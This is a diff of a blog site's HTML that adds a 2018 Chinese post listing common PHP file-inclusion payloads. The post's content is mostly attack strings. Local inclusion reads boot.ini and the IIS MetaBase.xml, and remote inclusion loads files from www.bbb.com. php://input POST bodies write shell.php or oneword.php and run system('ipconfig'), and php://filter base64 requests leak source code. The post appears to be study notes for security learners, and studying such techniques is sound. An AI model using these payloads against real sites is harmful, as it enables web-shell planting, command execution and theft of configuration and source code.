@@ -285,6 +285,164 @@
   <div id="posts" class="posts-expand">
     
 
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/09/文件包含漏洞常用命令/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="FDrag0n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/09/文件包含漏洞常用命令/" itemprop="url">文件包含漏洞常用命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-09T16:56:35+08:00">2018-04-09</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+		  
+		  
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="主要包含形式"><a href="#主要包含形式" class="headerlink" title="主要包含形式"></a>主要包含形式</h1><h2 id="1-包含本地文件"><a href="#1-包含本地文件" class="headerlink" title="1.包含本地文件"></a>1.包含本地文件</h2><p>payload：</p>
+<pre><code>?page=C:\oneword
+
+?file=C:\boot.ini（Windows查看系统版本）
+
+?file=C:\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件)
+</code></pre><h2 id="2-包含远程文件"><a href="#2-包含远程文件" class="headerlink" title="2.包含远程文件"></a>2.包含远程文件</h2><p>payload：</p>
+<pre><code>?url=http://www.bbb.com/2.txt
+
+?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp）
+</code></pre><h2 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h2><p>1) php://input</p>
+<p>说明：</p>
+<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</p>
+<p>条件：</p>
+<p>php &lt;5.0 ，allow_url_include=Off 情况下也可以用</p>
+<p>php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</p>
+<p>用例1 增加一句话：</p>
+<p>URL：</p>
+<pre><code>http://localhost/include/file.php?file=php://input
+</code></pre><p>POST：</p>
+<pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;
+</code></pre><p>用例2 增加文件：</p>
+<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code><br>这里fopen参数为w，可新建一个文件。</p>
+<p>用例3 执行系统命令：</p>
+<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php system(&#39;ipconfig&#39;);?&gt;</code></p>
+<hr>
+<p>2)data://</p>
+<p>说明：</p>
+<p>这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)</p>
+<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
+<p>条件：</p>
+<p>allow_url_include=On<br>php &gt; 5.2</p>
+<hr>
+<p>3)<strong>php://filter</strong></p>
+<p>说明：</p>
+<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：</p>
+<pre><code>?page=php://filter/read=convert.base64-encode/resource=php.ini
+</code></pre><p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p>
+<p><strong>payload:</strong></p>
+<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php
+</code></pre><p>资料来源：<br><a href="https://www.anquanke.com/post/id/86123" title="参考网站" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86123</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
 
 
     <div class="post-spread">
@@ -462,7 +620,7 @@
 
 
 <div>
-<script async src="js/src/js.js"></script>
+<script async src="/js/src/js.js"></script>
 <span id="busuanzi_container_site_pv" style="display:none">
     本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
     <span class="post-meta-divider">|</span>
